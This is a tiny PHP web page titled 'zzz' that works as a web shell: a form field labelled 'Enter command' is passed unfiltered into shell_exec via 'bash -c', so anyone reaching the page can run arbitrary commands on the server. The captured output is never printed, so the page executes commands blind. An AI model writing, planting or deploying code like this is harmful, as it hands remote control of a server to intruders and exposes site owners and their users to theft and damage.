<!DOCTYPE html>
<html>
<head>
    <title>zzz</title>
</head>
<body>
    <h2>What's going on here?</h2>
    <form method="post" action="">
        <input type="text" name="interesting" placeholder="Enter command">
        <input type="submit" value="Execute">
    </form>

    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $command = $_POST["interesting"];
        if ($command) {
            $output = shell_exec("bash -c '$command'");
        } else {
            echo "<h2>Enter something!</h2>";
        }
    }
    ?>
</body>
</html>
